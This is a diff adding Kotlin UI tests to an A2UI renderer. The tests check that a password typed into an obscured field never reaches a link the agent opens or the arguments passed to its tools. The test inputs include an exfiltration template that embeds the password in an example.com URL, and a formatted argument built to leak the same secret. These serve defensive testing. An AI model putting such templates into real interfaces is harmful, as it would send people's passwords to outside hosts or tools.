@@ -539,6 +539,66 @@ internal class A2UIRendererTest {
         assertEquals(mapOf("user" to "ada"), action.payload["dataModel"])
     }
 
+    // A password field and a button whose action is [action].
+    private fun passwordForm(action: Map<String, Any?>, vararg more: Map<String, Any?>) = surface(
+        mapOf("id" to "root", "component" to "Column", "children" to listOf("password", "go") + more.map { it["id"] }),
+        mapOf(
+            "id" to "password",
+            "component" to "TextField",
+            "label" to "Password",
+            "variant" to "obscured",
+            "value" to mapOf("@path" to "/password"),
+        ),
+        mapOf("id" to "go", "component" to "Button", "child" to "label", "action" to action),
+        mapOf("id" to "label", "component" to "Text", "text" to "Go"),
+        *more,
+    )
+
+    @Test
+    fun `a link an action opens never carries what a person typed into an obscured field`() {
+        val url = mapOf("@call" to "formatString", "args" to mapOf("value" to "https://example.com/?p=\${/password}"))
+        val action = mapOf("functionCall" to mapOf("@call" to "openUrl", "args" to mapOf("url" to url)))
+        show(document(passwordForm(action)))
+
+        rule.onNodeWithText("Password").performTextInput("hunter2")
+        rule.onNodeWithText("Go").performClick()
+
+        assertEquals(listOf("https://example.com/?p="), opened)
+    }
+
+    @Test
+    fun `a tool's arguments never carry what a person typed into an obscured field`() {
+        val runs = mutableListOf<String>()
+        val reads = mutableListOf<String>()
+        val host = hostWith(
+            tool("sign_in", runs = runs),
+            tool("strength", readOnly = true, runs = reads, output = "\"Checked\""),
+        )
+        val action = mapOf(
+            "functionCall" to mapOf(
+                "@call" to "sign_in",
+                "args" to mapOf(
+                    "password" to mapOf("@path" to "/password"),
+                    "hint" to mapOf("@call" to "formatString", "args" to mapOf("value" to "p=\${/password}")),
+                ),
+            ),
+        )
+        val strength = mapOf(
+            "id" to "strength",
+            "component" to "Text",
+            "text" to mapOf("@call" to "strength", "args" to mapOf("value" to mapOf("@path" to "/password"))),
+        )
+        show(document(passwordForm(action, strength)), host = host)
+
+        rule.onNodeWithText("Password").performTextInput("hunter2")
+        rule.onNodeWithText("Go").performClick()
+        rule.waitForIdle()
+
+        assertEquals(mapOf("hint" to "p="), A2UIJson.parseOrNull(runs.single()))
+        assertTrue(reads.isNotEmpty())
+        reads.forEach { assertFalse(it, "hunter2" in it) }
+    }
+
     @Test
     fun `the agent places the app's component, which reports its events`() {
         show(
